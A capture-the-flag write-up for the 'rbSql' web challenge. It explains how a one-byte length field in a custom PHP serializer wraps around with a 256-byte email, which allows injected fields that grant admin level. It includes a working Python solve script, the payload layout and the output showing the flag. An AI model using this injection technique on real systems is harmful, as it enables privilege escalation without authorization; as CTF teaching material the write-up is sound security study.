## rbSql (Web, 215pt)

> http://52.78.188.150/rbsql_4f6b17dc3d565ce63ef3c4ff9eef93ad/
> 
> [Download](src)

![](site.png)

I solved this challenge alongside my teammate [@tomtoump](https://github.com/tomtoump).

Source code was given for the challenge - you can find it in the [src](src) folder.

The challenge requires us to login with an admin account (`$_SESSION['lvl'] === "2"`) and access our profile in order to get flag.

```php
  elseif($page == "me"){
    echo "<p>uid : {$_SESSION['uid']}</p><p>level : ";
    if($_SESSION['lvl'] == 1) echo "Guest";
    elseif($_SESSION['lvl'] == 2) echo "Admin";
    echo "</p>";
    include "dbconn.php";
    $ret = rbSql("select","member_".$_SESSION['uid'],["id",$_SESSION['uid']]);
    echo "<p>mail : {$ret['1']}</p><p>ip : {$ret['3']}</p>";
    if($_SESSION['lvl'] === "2"){
      echo "<p>Flag : </p>";
      include "/flag";
      rbSql("delete","member_".$_SESSION['uid'],["id",$_SESSION['uid']]);
    }
  }
```

Before going deeper, the overall application functionality is outlined below.

```php
if ($page == "login")           {  // GET /?page=login
  //...
} elseif ($page == "join")      {  // GET /?page=join
  //...
} elseif ($page == "login_chk") {  // POST /?page=login_chk
  //...
} elseif ($page == "join_chk")  {  // POST /?page=join_chk
  //...
} elseif ($page == "photo")     {
  //...
} elseif ($page == "video")     {
  //...
} elseif ($page == "me")        {
  //...
} elseif ($page == "logout")    {
  //...
} else {
  //...
}
```

The application implements a **custom file-based database** (`dbconn.php`) allowing common CRUD operations (apart from update but this is not important for the challenge).

In order to start debugging, we can create the `rbSqlSchema` file using the following code:

```php
include "dbconn.php";
$data = ["rbSqlSchema", "/rbSqlSchema", ["tableName", "filePath"]];
rbWriteFile("./rbSqlSchema", $data);
```

Upon user registration the following code is executed:

```php
  elseif($page == "join_chk"){
    $uid = $_POST['uid'];
    $umail = $_POST['umail'];
    $upw = $_POST['upw'];
    if(($uid) && ($upw) && ($umail)){
      if(strlen($uid) < 3) error("id too short");
      if(strlen($uid) > 16) error("id too long");
      if(!ctype_alnum($uid)) error("id must be alnum!");
      if(strlen($umail) > 256) error("email too long");
      include "dbconn.php";
      $upw = md5($upw);
      $uip = $_SERVER['REMOTE_ADDR'];
      if(rbGetPath("member_".$uid)) error("id already existed");
      $ret = rbSql("create","member_".$uid,["id","mail","pw","ip","lvl"]);
      if(is_string($ret)) error("error");
      $ret = rbSql("insert","member_".$uid,[$uid,$umail,$upw,$uip,"1"]);
      if(is_string($ret)) error("error");
      exit("<script>location.href='./?page=login';</script>");
    }
    else error("join fail");
  }
```

As seen in the `rbSql()` function, the statement

```php
$ret = rbSql("create","member_".$uid,["id","mail","pw","ip","lvl"]);
```

results in the creation of a separate table/file for each user and the same file is read to handle user authentication.

```php
  case "create":
    $result = rbReadFile(SCHEMA);
    for($i=3;$i<count($result);$i++){
      if(strtolower($result[$i][0]) === strtolower($table)){
        return "Error6";
      }
    }
    $fileName = "../../rbSql/rbSql_".substr(md5(rand(10000000,100000000)),0,16);
    $result[$i] = array($table,$fileName);
    rbWriteFile(SCHEMA,$result);
    exec("touch {$fileName};chmod 666 {$fileName}");
    $content = array($table,$fileName,$query);
    rbWriteFile($fileName,$content);
    break;
```

We also observe that users are registered with `lvl === 1` (guest).

```php
$ret = rbSql("insert","member_".$uid,[$uid,$umail,$upw,$uip,"1"]);
```

As shown above, user-input filtering is quite permissive:

```php
if(strlen($uid) < 3) error("id too short");
if(strlen($uid) > 16) error("id too long");
if(!ctype_alnum($uid)) error("id must be alnum!");
if(strlen($umail) > 256) error("email too long");
```

It seems like we can inject whatever we like in the queries (no chars filtered apart from length) but the question is what should we inject!

User registration triggers the following function chain:

```
insert -> rbReadFile -> rbParse -> rbWriteFile -> rbPack
```

User login triggers the following function chain:

```
select -> rbReadFile -> rbParse
```

Auditing the source code of the application we concluded that the most important function to analyze is `rbPack()` which is used to serialize the data passed as argument.

```php
define("STR", chr(1), true);
define("ARR", chr(2), true);

function rbPack($data){
  $rawData = "";
  if(is_string($data)){
    $rawData .= STR . chr(strlen($data)) . $data;
  }
  elseif(is_array($data)){
    $rawData .= ARR . chr(count($data));
    for($idx=0;$idx<count($data);$idx++) $rawData .= rbPack($data[$idx]);
  }
  return $rawData;
}
```

Byte `\x01` denotes string and byte `\x02` denotes array. Then **the length of the data is stored in a single byte**.

```php
$a = array("a", "bb");
```

The above array will be serialized to the following:

```
\x02\x02\x01\x01a\x01\x02bb
```

Because the length is stored in a single byte, instead of `strlen($data)` the code uses `chr(strlen($data))`.

In the [PHP documentation](https://secure.php.net/manual/en/function.chr.php) we read the following:

> Values outside the valid range (0..255) will be bitwise and'ed with 255, which is equivalent to the following algorithm:

```
while ($ascii < 0) {
    $ascii += 256;
}
$ascii %= 256;
```

```
❯❯❯ php -r 'echo chr(256);' | hexdump
0000000 00
0000001
```

The final piece of the puzzle is that application will also allow email addresses with 256 chars!

```php
if(strlen($umail) > 256) error("email too long");
```

The plan is to send a 256-bytes email that will result in the bytes `\x01\x00` to prepend the email. The user will have an empty email address and we start injecting the password field with the precalculated MD5 hash of the user password. Then we inject the IP address which will also act as padding to reach the required length of 256 bytes. Finally, we inject the user level which will be `2` for admin.

Below is given the layout of our final payload:

```
\x01\x201a1dc91c907325c69271ddf0c944bc72
\x01\xD9AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
\x01\x012
```

Our solution is summarized in the [solve.py](solve.py) script.

```python
import re
import random
import urllib
import hashlib
import requests

_target = 'http://52.78.188.150/rbsql_4f6b17dc3d565ce63ef3c4ff9eef93ad/'
_pw = 'pass'
_uid = str(random.randint(1000, 9999))

mail = '\x01\x20' + hashlib.md5(_pw).hexdigest()
lvl = '\x01\x012'  # lvl === '2' => admin

pad_len = 256 - (len(mail) + len(lvl) + 2)
ip = '\x01' + chr(pad_len) + 'A'*pad_len

payload = mail + ip + lvl

print '[+] UID:      ' + _uid
print '[+] Password: ' + _pw
print '[+] Payload:  ' + urllib.quote(payload)

s = requests.Session()
s.post(_target+'?page=join_chk', data={"uid": _uid, "umail": payload, "upw": _pw})
s.post(_target+'?page=login_chk', data={"uid": _uid, "upw": _pw})
resp = s.get(_target+'?page=me')

flag = re.search('FLAG\{([^}]+)\}', resp.text).group(1)
print '[+] Flag:     FLAG{{{}}}'.format(flag)
```

```
[+] UID:      7951
[+] Password: pass
[+] Payload:  %01%201a1dc91c907325c69271ddf0c944bc72%01%D9AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA%01%012
[+] Flag:     FLAG{akaneTsunemoriIsSoCuteDontYouThinkSo?}
```
